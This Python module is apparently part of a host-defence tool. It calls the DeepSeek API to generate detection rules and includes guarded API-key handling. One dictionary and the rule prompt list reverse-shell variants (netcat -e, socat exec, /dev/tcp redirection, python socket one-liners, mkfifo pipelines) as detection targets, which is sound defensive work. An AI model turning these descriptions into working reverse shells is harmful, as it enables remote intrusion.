"""Operator-only DeepSeek HTTPS client. No key fragments or remote errors escape.

Yalnızca operatörün kullandığı DeepSeek HTTPS istemcisi. Anahtar parçası ya da
uzak hata metni dışarı sızmaz.
"""
from __future__ import annotations
import json
import os
import re
import ssl
import stat
import urllib.error
import urllib.request
from pathlib import Path

KEY_PATH = Path('/etc/satsuma-core/deepseek.key')
DEFAULT_ENDPOINT = 'https://api.deepseek.com/v1/chat/completions'
DEFAULT_MODEL = 'deepseek-chat'
DEFAULT_TIMEOUT = 30
MAX_RESPONSE_BYTES = 262144
ATTACK_TYPES = ('reverse_shell', 'privilege_escalation', 'credential_access',
                'persistence', 'defense_evasion', 'network_reconnaissance', 'malware',
                'memory_code_integrity','anonymous_executable','memfd_execution')

# 2.2.47: one rule covers one variant. Models listed every reverse-shell tool in
# cmd_contains and every indicator in cmd_arg_contains; the keys are ANDed, so
# "nc -e /bin/sh HOST PORT" (no /dev/tcp, no socket) never matched and no
# reverse-shell rule ever passed its own test. Each request now names the
# variants, and the rules already present, so the model writes the next one.
# 2.2.47: bir kural tek bir varyantı kapsar; mevcut kurallar istemde listelenir.
VARIANTS = {
    'reverse_shell': ('bash or sh running a /dev/tcp or /dev/udp redirection inside sh -c / bash -c '
                      '(cmd_arg_contains "/dev/tcp/")',
                      'netcat with a program to run: nc -e, nc -c, ncat -e, ncat --sh-exec, nc.traditional -e',
                      'socat connecting a shell: socat with exec: or EXEC: or system: argument',
                      'python or python3 -c one-liner with socket and dup2 / pty.spawn',
                      'perl -e one-liner with Socket / IO::Socket',
                      'php -r one-liner with fsockopen',
                      'ruby -e one-liner with TCPSocket',
                      'mkfifo pipeline feeding sh -i into nc (inside sh -c)',
                      'telnet pipeline feeding a shell (inside sh -c)',
                      'openssl s_client pipeline feeding a shell (inside sh -c)',
                      'awk or gawk with /inet/tcp/',
                      'lua -e or node -e with a socket and a spawned shell'),
}
MAX_KNOWN = 12


class DeepSeekError(Exception):
    """Safe, bounded public error codes only."""


def load_api_key():
    if os.geteuid() != 0:
        return None
    try:
        fd = os.open(KEY_PATH, os.O_RDONLY | os.O_NOFOLLOW | os.O_NONBLOCK)
        with os.fdopen(fd, 'rb') as stream:
            st = os.fstat(stream.fileno())
            if (not stat.S_ISREG(st.st_mode) or st.st_uid != 0 or st.st_gid != 0
                    or stat.S_IMODE(st.st_mode) != 0o600 or st.st_nlink != 1 or st.st_size > 4096):
                return None
            key = stream.read(4097).decode('ascii').strip()
            if not key or any(ord(c) < 33 or ord(c) > 126 for c in key):
                return None
            return key
    except (OSError, UnicodeError):
        return None


def is_available():
    return load_api_key() is not None


def key_problem(path=None):
    """Why the key cannot be used, or None. Same checks as load_api_key; never reads the key out.

    Anahtarın neden kullanılamadığı ya da None. load_api_key ile aynı
    kontroller; anahtarın kendisi dışarı verilmez.
    """
    path = KEY_PATH if path is None else Path(path)
    if os.geteuid() != 0:
        return 'backend_not_root'
    try:
        st = os.lstat(path)
    except FileNotFoundError:
        return 'key_file_missing'
    except OSError:
        return 'key_file_unreadable'
    if stat.S_ISLNK(st.st_mode) or not stat.S_ISREG(st.st_mode):
        return 'key_not_regular_file'
    if st.st_uid != 0 or st.st_gid != 0:
        return 'key_owner_must_be_root_root'
    if stat.S_IMODE(st.st_mode) != 0o600:
        return 'key_mode_must_be_0600'
    if st.st_nlink != 1:
        return 'key_has_extra_hard_link'
    if st.st_size > 4096 or st.st_size == 0:
        return 'key_size_invalid'
    return None if load_api_key() is not None else 'key_content_invalid'


def save_api_key(key):
    """Explicit root CLI only; never overwrite or chmod an existing key."""
    if os.geteuid() != 0:
        return {'saved': False, 'error': 'root_required'}
    if not isinstance(key, str) or not 16 <= len(key) <= 4096 or any(ord(c) < 33 or ord(c) > 126 for c in key):
        return {'saved': False, 'error': 'invalid_key'}
    try:
        fd = os.open(KEY_PATH, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_NOFOLLOW, 0o600)
        with os.fdopen(fd, 'w') as stream:
            os.fchown(stream.fileno(), 0, 0)
            stream.write(key); stream.flush(); os.fsync(stream.fileno())
        return {'saved': True, 'path': str(KEY_PATH)}
    except OSError:
        return {'saved': False, 'error': 'key_not_created_existing_file_preserved'}


def clear_api_key():
    if os.geteuid() != 0:
        return {'cleared': False, 'error': 'root_required'}
    try:
        KEY_PATH.unlink()
        return {'cleared': True}
    except OSError:
        return {'cleared': False, 'error': 'key_not_removed'}


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise DeepSeekError('redirect_refused')


def _http_post(url, payload, api_key, timeout):
    if url != DEFAULT_ENDPOINT:
        raise DeepSeekError('endpoint_not_allowed')
    request = urllib.request.Request(url, data=json.dumps(payload).encode(), method='POST',
        headers={'Content-Type': 'application/json', 'Authorization': 'Bearer ' + api_key,
                 'User-Agent': 'Satsuma-Core/2.2.15'})
    opener = urllib.request.build_opener(_NoRedirect(), urllib.request.HTTPSHandler(context=ssl.create_default_context()))
    try:
        with opener.open(request, timeout=timeout) as response:
            raw = response.read(MAX_RESPONSE_BYTES + 1)
        if len(raw) > MAX_RESPONSE_BYTES:
            raise DeepSeekError('response_too_large')
        parsed = json.loads(raw)
        if not isinstance(parsed, dict):
            raise DeepSeekError('unexpected_response')
        return parsed
    except urllib.error.HTTPError as exc:
        raise DeepSeekError({401: 'authentication_failed', 403: 'authentication_failed',
                             429: 'quota_exceeded'}.get(exc.code, 'api_http_error')) from None
    except (TimeoutError,):
        raise DeepSeekError('request_timeout') from None
    except DeepSeekError:
        raise
    except Exception:
        raise DeepSeekError('network_or_response_error') from None


def _request(prompt, config, confirmed, *, max_tokens=2048, temperature=0.2):
    config = config or {}
    if confirmed is not True:
        raise DeepSeekError('explicit_network_consent_required')
    if config.get('deepseek_enabled') is not True:
        raise DeepSeekError('deepseek_disabled')
    if config.get('deepseek_endpoint', DEFAULT_ENDPOINT) != DEFAULT_ENDPOINT:
        raise DeepSeekError('endpoint_not_allowed')
    if len(prompt.encode()) > 32768:
        raise DeepSeekError('prompt_too_large')
    key = load_api_key()
    if not key:
        raise DeepSeekError('key_unavailable_root_0600_required')
    timeout = min(45, max(1, int(config.get('deepseek_timeout', DEFAULT_TIMEOUT))))
    payload = {'model': DEFAULT_MODEL, 'messages': [{'role': 'system', 'content':
               'Return only JSON data. Never execute commands or request secrets.'},
               {'role': 'user', 'content': prompt}], 'temperature': temperature,
               'max_tokens': max_tokens, 'response_format': {'type': 'json_object'}}
    try:
        response = _http_post(DEFAULT_ENDPOINT, payload, key, timeout)
        content = response['choices'][0]['message']['content']
        if not isinstance(content, str) or key in content:
            raise DeepSeekError('unsafe_or_unexpected_response')
        result = json.loads(content)
        if not isinstance(result, dict):
            raise DeepSeekError('unexpected_response')
        return result
    except DeepSeekError:
        raise
    except Exception:
        raise DeepSeekError('unexpected_response') from None


def connection_test(config=None, *, confirmed=False):
    result = _request('Return {"connection":"ok"}. No research.', config, confirmed, max_tokens=16)
    if result != {'connection': 'ok'}:
        raise DeepSeekError('unexpected_connection_response')
    return {'connected': True, 'transport': 'HTTPS', 'model': DEFAULT_MODEL}


def _known_text(known):
    """Rules already present, as compact base_match JSON, bounded in count and size."""
    lines = []
    for item in list(known or ())[:MAX_KNOWN]:
        try:
            text = json.dumps(item, sort_keys=True, ensure_ascii=False, separators=(',', ':'))
        except (TypeError, ValueError):
            continue
        lines.append('- ' + text[:300])
    return '\n'.join(lines)


def _feedback_text(feedback):
    """Why the previous reply was refused: Satsuma's own codes and failing synthetic events only."""
    if not isinstance(feedback, dict):
        return ''
    parts = []
    for error in list(feedback.get('errors') or [])[:10]:
        parts.append('- ' + str(error)[:160])
    for case in list(feedback.get('failed') or [])[:6]:
        if isinstance(case, dict):
            parts.append('- ' + str(case.get('case'))[:20] + ' event ' + json.dumps(case.get('event'), ensure_ascii=False)[:300]
                         + (' was not matched' if case.get('case') == 'positive' else ' was wrongly matched'))
    if feedback.get('duplicate'):
        parts.append('- the reply repeated a rule that is already present')
    return '\n'.join(parts)


def generate_rule(technique, attack_type, schema_hint, config=None, *, confirmed=False, known=(), feedback=None):
    if technique and not re.fullmatch(r'T\d{4}(?:\.\d{3})?', technique):
        raise DeepSeekError('invalid_mitre_technique')
    if attack_type not in ATTACK_TYPES:
        raise DeepSeekError('unsupported_attack_type')
    definition = ''
    if technique:
        from .definitions import technique as describe
        entry = describe(technique)
        if entry:
            definition = (f' ATT&CK definition: {entry["id"]} {entry["name"]} (tactics: {", ".join(entry["tactics"])}): '
                          f'{entry["description"]}' + (f' {technique} was revoked and replaced by {entry["id"]}.' if entry.get('revoked_from') else ''))
    prompt = ('Produce one Satsuma research proposal package matching this JSON schema. '
              'Use CURRENT_TELEMETRY. For process threats use source sys_proc. For memory threats '
              'use source memory and only these implemented action names: memfd_executable, '
              'deleted_executable, anonymous_rwx, memfd_mapping, executable_code_mismatch, '
              'writable_dir_code_mapping, process_traced. '
              'Anonymous/JIT/memfd observations alone do not establish malware. Detection actions may only be record, evidence, '
              'correlation_request. No ticket, auto_action, execution or scripts. '
              'The response proposal is advisory, never an instruction to execute. '
              'One rule covers ONE variant of the threat. All base_match keys are ANDed, so a rule that lists '
              'several tools in cmd_contains and several indicators in cmd_arg_contains only works if EVERY tool '
              'line carries one of those indicators; when variants need different indicators, write the rule for '
              'one variant only (for example nc -e alone, or bash with /dev/tcp/ alone). '
              'cmd is the argv the kernel reports (/proc/PID/cmdline): redirections, pipes and ; are only '
              'visible inside a shell -c string, so a one-liner test event is written as bash -c \'...\' or sh -c \'...\'. '
              'Matchers are exact, not substrings: cmd_contains is a program name optionally followed by its '
              'arguments in order (e.g. "nc -e", "bash -i", "curl"); the first word must be the program. '
              'Use cmd_arg_contains for a path, address or host anywhere in the arguments (e.g. "/dev/tcp/"). '
              'All base_match keys must match together (AND); alternatives belong in one list, so every '
              'positive event must satisfy every key you use. '
              'exe_contains matches the executable path, parent_contains the parent command line. '
              'Test events: process events have source and cmd; memory events have source memory and action. '
              'Include positive, negative and wrong_source synthetic events; never real host data. '
              'Omit detection_sha256: Satsuma computes this canonical content binding locally. '
              'Always include response_proposal. To stop a malicious process use exactly: requested_action '
              'process_kill, target_type process, required_sources ["sys_proc"] (or ["memory","sys_proc"] for '
              'memory threats; never audit), minimum_sources 2, execution requires_policy_authorization, evidence_required true, '
              'operator_review true, verification_level fresh_independent_same_target_records, and all four '
              'policy_preconditions. For network threats use network_isolate with target_type network; for files '
              'file_quarantine with target_type file. Only if no intervention is justified use record with target_type none. Do not write scoring, threshold or base_score: base_match alone decides a match. '
              f'MITRE: {technique or "unspecified"}; threat: {attack_type}.{definition} ')
    if attack_type in VARIANTS:
        prompt += 'Known variants of this threat: ' + '; '.join(VARIANTS[attack_type]) + '. '
    known_text = _known_text(known)
    if known_text:
        prompt += ('These base_match rules already exist on this machine; do not repeat them or their variant. '
                   'Choose a variant that none of them catches and give it a new rule_id:\n' + known_text + '\n')
    feedback_text = _feedback_text(feedback)
    if feedback_text:
        prompt += ('Your previous reply was refused by Satsuma\'s local validation. Correct it; '
                   'keep to one variant so every positive event satisfies every base_match key:\n' + feedback_text + '\n')
    prompt += f'Schema: {schema_hint}'
    # A little variety: the same prompt at 0.2 returned the same rule every time.
    return _request(prompt, config, confirmed, temperature=0.7 if (known_text or feedback_text) else 0.4)
